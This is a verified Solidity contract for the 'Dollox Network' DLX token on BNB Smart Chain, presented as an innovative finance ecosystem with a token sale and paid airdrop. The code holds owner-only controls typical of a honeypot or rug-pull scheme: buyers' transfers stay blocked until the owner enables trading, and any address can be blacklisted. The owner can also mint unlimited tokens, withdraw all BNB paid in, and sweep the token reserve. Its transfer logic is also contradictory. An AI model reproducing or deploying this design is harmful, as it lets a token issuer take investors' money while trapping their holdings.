/**
 *Submitted for verification at BscScan.com on 2023-03-03
*/

/**
 *Welcome to the Dollox Network Ecosystem
 *DLX is a decentralized network on Binance Smart Chain that provides innovative tools for users to control their finances and investments.
 *Official website https://dollox.network
 *Official Support [email protected]
**/

/**
  ,,,,,,                           ▐████   █████
 ▐██████████▄▄                     ▐████   █████
 ▐████▀▀▀▀█████▄                   ▐████   █████
 ▐████     ▀████▄    ,▄██████▄,    ▐████   █████     ▄██████▄▄   *████▄   ████▌
 ▐████      █████   ████████████   ▐████   █████   ▄███████████,  ▀████▄,████▀
 ▐████      █████  █████    █████  ▐████   █████  ▐████`   ▀████   `████████▀
 ▐████      █████  ████▌    ▐████  ▐████   █████  █████     ████▌    ██████▌
 ▐████     ▄████▌  ████▌    ▐████  ▐████   █████  █████    ▐████`   ████████⌐
 ▐████▄▄▄▄█████▀   ▀████▄▄▄▄████▀  ▐████   █████   █████▄▄▄█████   █████▀████▄
 ▐██████████▀▀      `██████████`   ▐████   █████    ▀█████████▀  ,████▀  ▀████▄
  `````` `             -▀▀▀▀-       ````    ```        `▀▀▀       ````     ````

  ▄▄▄    ╒▄                                                            ╔▄
  █▀█▄   ▐█                ▐█                                          ▐█
  █▌▐█   ▐█     ,▄██▄▄    ▄██▄▄▄  ╔▄    ▄▄    ▄r    ▄▄██▄▄     ▄ ▄▄█   ▐█   ▄▄
  █▌ ▀█  ▐█    ▐█▀   ██    ▐█      █µ  ▐▌█▌  ▐█    ██   ╙█▌    █▀▀     ▐█ ,█▀
  █▌  ▀█ ▐█    ██▄▄▄▄█▌    ▐█      ▀█  █ ▐█  █▌    █⌐    █▌    █-      ▐█▀█▌
  █▌   ██▐█    ▐█          ▐█       █⌐▐█  █▌▐█     █▌    █▌    █-      ▐█  █▄
  █▌    ███     ██▄▄▄▄▄    ▐█▄▄r    ▐██   ▐██▌     ▀█▄▄▄██     █-      ▐█   ██
**/

// SPDX-License-Identifier: MIT

pragma solidity >=0.5.10;

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
  event BlacklistUpdated(address indexed _address, bool _isBlacklisted);

}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);


  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }


  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  
  mapping (address => bool) _hasClaimed;
  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;
  mapping(address => bool) public isBlacklisted;
  bool public tradingEnabled = false;

  constructor() public {
    symbol = "DLX";
    name = "Dollox Network";
    decimals = 18;
    _totalSupply =  1000000000*10** uint(decimals);
    balances[owner] = 750000000*10** uint(decimals);
    balances[address(this)] = 250000000*10** uint(decimals);
    emit Transfer(address(0), owner, 750000000*10** uint(decimals));
    emit Transfer(address(0), address(this), 250000000*10** uint(decimals));
  }

  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }


function transfer(address to, uint tokens) public returns (bool success) {
       // If the auction is not yet enabled, we allow the transfer only to the owner of the contract
        if (!tradingEnabled) {
            require(msg.sender == owner, "Transfers not allowed yet.");
        }
        require(tradingEnabled, "Trading is not enabled yet.");
        require(!isBlacklisted[msg.sender], "Your address is blacklisted.");
        require(!isBlacklisted[to], "Recipient's address is blacklisted.");
        balances[msg.sender] = balances[msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }


  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }

  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract DolloxNetwork is TokenBEP20 {

  uint256 public aSBlock; 
  uint256 public aEBlock; 
  uint256 public aCap; 
  uint256 public aTot; 
  uint256 public aAmt;
  uint256 constant private INVEST_MIN_AMOUNT = 0.05 ether;


  uint256 public sSBlock; 
  uint256 public sEBlock; 
  uint256 public sCap; 
  uint256 public sTot; 
  uint256 public sChunk; 
  uint256 public sPrice;
   

  constructor () public {
      
      startAirdrop(block.number,99999999, 200*10** uint(decimals), 20000000);
      startSale(block.number, 99999999, 0, 40000*10** uint(decimals), 230000000);
}

  function tokenSale(address _refer) public payable returns (bool success){
    require(msg.value >= INVEST_MIN_AMOUNT, "dineden");
    require(sSBlock <= block.number && block.number <= sEBlock);
    require(sTot < sCap || sCap == 0);
    uint256 _eth = msg.value;
    uint256 _tkns;
    _tkns = (sPrice*_eth) / 1 ether;
    sTot ++;
        if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(_tkns / 4);
      balances[_refer] = balances[_refer].add(_tkns / 4);
      emit Transfer(address(this), _refer, _tkns / 4);
}
    
    balances[address(this)] = balances[address(this)].sub(_tkns);
    balances[msg.sender] = balances[msg.sender].add(_tkns);
    emit Transfer(address(this), msg.sender, _tkns);
    return true;
}

   function claimAirDrop(address _refer) public payable{
      require(msg.value >= 0.001 ether,"insufficient funds");

      balances[address(this)] = balances[address(this)].sub(200 *10** uint(decimals));
      balances[msg.sender] = balances[msg.sender].add(200 *10** uint(decimals));
      emit Transfer(address(this), msg.sender,  200 *10** uint(decimals));  

        if(msg.sender != _refer && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(50 *10** uint(decimals));
      balances[_refer] = balances[_refer].add(50 *10** uint(decimals));
      emit Transfer(address(this), _refer, 50 *10** uint(decimals));
    }   
}

  function viewAirdrop() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){
    return(aSBlock, aEBlock, aCap, aTot, aAmt);
}

  function viewSale() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){
    return(sSBlock, sEBlock, sCap, sTot, sChunk, sPrice);
}
  
  function startAirdrop(uint256 _aSBlock, uint256 _aEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner() {
    aSBlock = _aSBlock;
    aEBlock = _aEBlock;
    aAmt = _aAmt;
    aCap = _aCap;
    aTot = 0;
}

  function startSale(uint256 _sSBlock, uint256 _sEBlock, uint256 _sChunk, uint256 _sPrice, uint256 _sCap) public onlyOwner() {
    sSBlock = _sSBlock;
    sEBlock = _sEBlock;
    sChunk = _sChunk;
    sPrice =_sPrice;
    sCap = _sCap;
    sTot = 0;
}

  function clearETH() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
}


function ban(address[] memory addresses) public onlyOwner {
    for (uint i = 0; i < addresses.length; i++) {
        isBlacklisted[addresses[i]] = true;
        emit BlacklistUpdated(addresses[i], true);
    }
}

function unban(address[] memory addresses) public onlyOwner {
    for (uint i = 0; i < addresses.length; i++) {
        isBlacklisted[addresses[i]] = false;
        emit BlacklistUpdated(addresses[i], false);
    }
}


function mint(uint amount) public onlyOwner returns (bool) {
    _totalSupply = _totalSupply.add(amount);
    balances[msg.sender] = balances[msg.sender].add(amount);
    emit Transfer(address(0), msg.sender, amount);
    return true;
}


function enableTrading() public onlyOwner {
    tradingEnabled = true;
}

  function() external payable {
}

  function exitToken() public onlyOwner() {
  sCap = 0;
  aCap = 0;
  uint256 bl = balances[address(this)];
  balances[msg.sender] = balances[msg.sender].add(bl);
  balances[address(this)] = balances[address(this)].sub(bl);
  emit Transfer(address(this), msg.sender, bl);
 }

}